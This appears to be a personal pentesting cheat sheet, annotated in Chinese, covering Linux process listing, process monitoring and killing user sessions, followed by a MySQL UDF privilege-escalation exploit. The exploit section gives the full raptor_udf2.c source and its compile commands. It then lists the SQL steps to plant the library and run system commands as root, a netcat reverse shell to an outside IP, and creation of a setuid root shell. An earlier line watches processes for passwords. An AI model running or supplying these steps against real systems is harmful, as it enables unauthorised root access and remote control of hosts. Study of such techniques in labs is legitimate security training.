### Proc
```bash
top
htop

ps -A #all
ps -axjf #树形结构显示进程
ps aux | grep root
ps aux | more
ps aux | less

pgrep <process-name>

#watach
watch -n 1 "ps -aux | grep pass"   #watch -n 1每秒重复执行ps命令
# 刷新还挺快，记得准备保存
script -c "watch -n 1 'ps -aux | grep pass'" output.txt #保存所有会话
cat --show-all output.txt #--show-all才可以看到
watch -n 1 "ps -aux | grep pass" | tee --append output

#best
watch -n 1 'ps -aux | grep pass | tee --append output'
```
[无需root的进程实时监控 -- pspy](https://github.com/DominicBreuker/pspy?tab=readme-ov-file)

# Terminating Proc
```bash
kill
kill -9 PID
pkill processName
killall
```
### Kill user tty/pts sessions in Linux

#### Commands

- `w`: show who is logged on and what they are doing
- `who`: show who is logged on
- `tty`: show current users pseudo terminal
- `ps -ft pts/1`: get process id for the pseudo terminal
- `pkill`: signal process based on name and other attributes

1. Check active users logged into the server with: `w`
```bash
 16:53:37 up 23:46,  2 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
debian   pts/1    24.69.132.96     16:45    0.00s  0.04s  0.00s w
debain   pts/2    24.69.132.96:S.0 16:35   16.00s  0.02s  0.02s /bin/bash
```
2. Get the PID (Process ID) of a connected terminal (tty) with: `ps -ft pts/1`

```bash
UID        PID  PPID  C STIME TTY          TIME CMD
debian   28580 28102  0 16:45 pts/1    00:00:00 -bash
debian   29081 28580  0 16:55 pts/1    00:00:00 ps -ft pts/1
```

3. Kill the process: `kill 28580`
4. Alternatively use `pkill -t pts/1`

# Exploit
## mysql UDF提权
> mysql User Defined Functions
> 相对来说还是需要有mysql的根权限账户才可以，否则无法在插件目录或者在mysql数据库中进行建表导出文件的操作。
### UDF
UDF可以是任意语言所写，只要放入`library`即可使用。我们可以创建恶意函数，在底层操作系统上运行与正在运行的服务具有相同权限的命令。
```C
//raptor_udf2.c
#include <stdio.h>
#include <stdlib.h>
 
enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
 
typedef struct st_udf_args {
        unsigned int arg_count; // number of arguments
        enum Item_result *arg_type; // pointer to item_result
        char **args; // pointer to arguments
        unsigned long *lengths; // length of string args
        char *maybe_null; // 1 for maybe_null args
} UDF_ARGS;
 
typedef struct st_udf_init {
        char maybe_null; // 1 if func can return NULL
        unsigned int decimals; // for real functions
        unsigned long max_length; // for string functions
        char *ptr; // free ptr for func data
        char const_item; // 0 if result is constant
} UDF_INIT;
 
int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
        if (args->arg_count != 1) {
                return(0);
        }
        system(args->args[0]);
        return(0);
}
 
char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
        return(0);
}
```
#### 编译
```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
### Exploit
```mysql
#login as root
show variables like '%plugin%'; #找到UDF的文件路径
show variables like '%secure_file_priv%'; #UDF文件可否修改导入导出(empty|NULL)
use mysql; #在mysql数据库中导入恶意payload
create table foo(line blob); #放置payload的table foo
insert into foo values(load_file('/var/www/raptor_udf2.so'));
#将恶意代码文件导入到table foo中, **此处需要plugin文件夹的读写权限**
select * from foo into dumpfile '<plugin_path>raptor_udf2.so';
#将table foo payload放到UDF dir
create function do_system returns integer soname 'raptor_udf2.so';
#利用该文件，创建UDF

select * from mysql.func; #确认函数已经导入
select do_system('id > /var/www/output; chown www-data www-data /var/www/output'); #开始利用
mysql> \! sh          #检查是否提权成功
\! sh
$ cat /var/www/out
cat /var/www/out
uid=0(root) gid=114(mysql) groups=114(mysql)

select do_system('nc 192.168.49.136 8080 -e /bin/bash'); #回弹shell
```
### 修改当前用户的权限
```bash
ls -la /usr/lib/lib_mysqludf_sys.so #查看sys相关的UDF
SELECT sys_exec('usermod -a -G admin john') #-a:添加组时，不移除当前组 -G:添加组
#利用moduser修改当前用户的权限

SELECT * FROM func;
use mysql;
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys exec('cp /bin/sh /tmp/shell;chown root /tmp/shell;chgrp root /tmp/shell;chmod u+s /tmp/shell');
#自行导入
```